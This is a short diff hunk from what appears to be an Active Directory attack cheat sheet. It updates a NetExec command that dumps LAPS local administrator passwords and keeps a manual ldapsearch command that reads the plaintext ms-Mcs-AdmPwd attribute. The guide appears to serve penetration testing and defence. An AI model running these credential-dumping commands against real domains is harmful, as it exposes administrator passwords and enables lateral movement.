@@ -111,7 +111,7 @@ gMSADumper.py -u attacker -p pass -d domain.local -l <DC_IP>
 **Explanation:** legacy LAPS stores the plaintext local admin password in `ms-Mcs-AdmPwd` (readable LDAP attribute); LAPS v2 (Windows LAPS) stores an **encrypted** blob in `msLAPS-EncryptedPassword` (and `msLAPS-Password` if encryption is disabled) that needs client-side decryption.
 ```bash
 # Automated, whole domain
-nxc ldap <DC_IP> -u attacker -p pass --laps
+nxc ldap <DC_IP> -u attacker -p pass -M laps
 
 # Manual LDAP read — legacy LAPS
 ldapsearch -x -H ldap://<DC_IP> -D "attacker@domain.local" -w pass -b "DC=domain,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
